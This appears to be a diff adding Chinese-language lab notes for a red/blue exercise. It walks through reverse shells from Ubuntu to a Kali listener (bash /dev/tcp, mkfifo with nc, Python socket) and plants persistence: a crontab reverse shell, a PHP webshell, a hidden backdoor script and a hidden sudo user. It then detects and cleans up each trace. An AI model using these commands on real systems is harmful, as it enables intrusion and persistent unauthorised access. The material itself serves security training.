@@ -1,0 +1,137 @@
+Step 0：🎯Kali启动监听
+  nc -lvnp 4444
+
+Step 1：🔧Ubuntu用bash /dev/tcp 反弹
+  # 新开一个终端，SSH到Ubuntu
+  ssh 用户名@UbuntuIP
+  bash -i >& /dev/tcp/KaliIP/4444 0>&1
+  # Kali的nc监听窗口 → 出现了Ubuntu的Shell！
+
+Step 2：🎯Kali上验证反弹成功
+  # 在nc监听窗口里敲：
+  whoami
+  id
+  pwd
+  # 返回了Ubuntu上的信息 → 反弹成功 ✅
+  # 升级Shell（Tab补全+Ctrl+C不断开）
+  python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+Step 3：如果bash /dev/tcp 不行，换nc方式
+  # nc -e /bin/sh Kali-IP Port
+  # 如果提示 "nc: invalid option -- 'e'" → 用mkfifo管道替代
+  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc KaliIP 5555 >/tmp/f      #这个每尝试过
+
+Step 4：如果前两种都不行，换Python方式
+  # python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("KaliIP",port));os.dup2(s.fileno(),0);
+    os.dup2(fileno(),1);os.dup2(fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Step 5：在🔧Ubuntu上留后门（安服视角排查做准备）
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+在反弹Shell或SSH窗口里执行以下命令，在Ubuntu上留下3种后门：
+
+# ① crontab定时反弹（每30分钟重启一次nc连接）
+echo '*/30 * * * * root /bin/bash -i >& /dev/tcp/KaliIP/4444 0>&1' | sudo tee -a /etc/crontab  #查的后门命令
+# 效果：每隔30分钟就会连回KaliIP:4444，即使反弹Shell断开也能恢复
+
+# ② 在/tmp/目录留下恶意文件（模拟WebShell）
+echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
+echo '#!/bin/bash' > /tmp/.backdoor.sh      #查的
+echo 'bash -i >& /dev/tcp/KaliIP/7777 0>&1' >> /tmp/.backdoor.sh    #查的
+chmod +x /tmp/.backdoor.sh
+# 效果：/tmp/目录出现伪装文件，安服排查时会被发现
+
+# ③ 添加一个隐藏用户
+sudo useradd -M -s /bin/bash -G sudo inspectuser 2>/dev/null
+echo 'inspectuser:password123' | sudo chpasswd 2>/dev/null
+# 效果：系统多了一个可登录的用户
+
+✅ 后门已留好。🎯Kali的反弹Shell不断开——一直连着，
+  这样安服视角排查时你能同时看到：
+  · 进程列表里有 nc/python 连接（恶意进程）
+  · netstat 里有 ESTABLISHED 外连（恶意外联）
+  · /tmp/ 目录有多余文件（WebShell）
+  · /etc/crontab 有多余的计划任务（持久化后门）
+  · 系统多了一个未知用户（后门账户）
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Step 6：切换视角——安服工程师
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+刚刚🎯Kali在🔧Ubuntu上做了以下操作：
+① 反弹Shell（nc/bash/python）
+② 留了crontab定时后门
+③ /tmp/放了恶意文件
+④ 新建了一个隐藏用户
+⑤ 反弹Shell连接一直没断
+
+切到🔧Ubuntu（开一个新SSH窗口或以受害者视角）
+
+### 🔴 Part 2：⭐ 安服视角——RCE攻击的检测方法
+
+```
+
+🎯Kali刚才在🔧Ubuntu上留了5种入侵痕迹。
+现在切换到🔧Ubuntu视角，找出它们。
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔧Ubuntu排查清单（对照Step 5你留的5个后门）
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+# ① 查恶意进程
+ps aux | grep -E "bash|nc|python|perl"
+# ✅ 看到：bash -i 
+
+# ② 查网络外连
+ss -tunp | grep ESTABLISHED
+# ✅ 能看到：KaliIP:4444  的 TCP连接
+
+# ③ 查/tmp/目录下的恶意文件
+ls -la /tmp/
+cat /tmp/shell.php
+ls -la /tmp/.backdoor.sh
+# ✅ 看到：shell.php（伪WebShell）、.backdoor.sh（隐藏文件）
+# 注意.backdoor.sh是隐藏文件（.开头），ls不加-la看不到
+
+# ④ 查crontab计划任务
+cat /etc/crontab
+# ✅ 看到：*/30 * * * * root bash -i >& /dev/tcp/KaliIP/4444
+# 这是一个定时反弹Shell的木马
+
+# ⑤ 查新增用户
+cat /etc/passwd | grep -E '/bin/bash|/bin/sh'
+# ✅ 看到：inspectuser 这是一个可登录的未知用户，还有root和原本的自己用户名
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🧹 清理：恢复环境
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔧Ubuntu执行以下命令，清理掉刚才留下的所有后门：
+
+# ① 清除临时文件
+rm -f /tmp/shell.php /tmp/.backdoor.sh
+ls -la /tmp/ | grep -E "shell|backdoor"
+# → 确认文件消失
+
+# ② 清除crontab后门
+sudo sed -i '/KaliIP/d' /etc/crontab
+cat /etc/crontab
+# → 确认KaliIP那一行被删掉
+
+# ③ 删除后门用户
+sudo userdel -r inspectuser 2>/dev/null
+cat /etc/passwd | grep inspectuser
+# → 无输出代表删除成功
+
+# ④ 终止反弹Shell进程（如果还在连着）
+kill $(pgrep -f "nc -e\|bash -i.*dev/tcp\|python3 -c.*socket") 2>/dev/null    #查的
+ps aux | grep -E "nc|python" | grep -v grep
+# → 无输出代表进程清理干净
+
+# ⑤ 最终自检
+echo "=== 进程 ===" && ps aux | grep -E "nc|python" | grep -v grep || echo "干净"    系统原本有开机启动的一些，没有输出干净
+echo "=== 外连 ===" && ss -tunp | grep ESTAB | grep -v "127.0.0.1" | grep -v ":22" || echo "干净"  本身有一个EDCH外连
+echo "=== crontab ===" && sudo cat /etc/crontab | grep KaliIP || echo "干净"   正常输出
+echo "=== 用户 ===" && cat /etc/passwd | grep inspectuser || echo "干净"  正常输出
+# 显示"干净" → 环境已重置 ✅
+```
+
+---
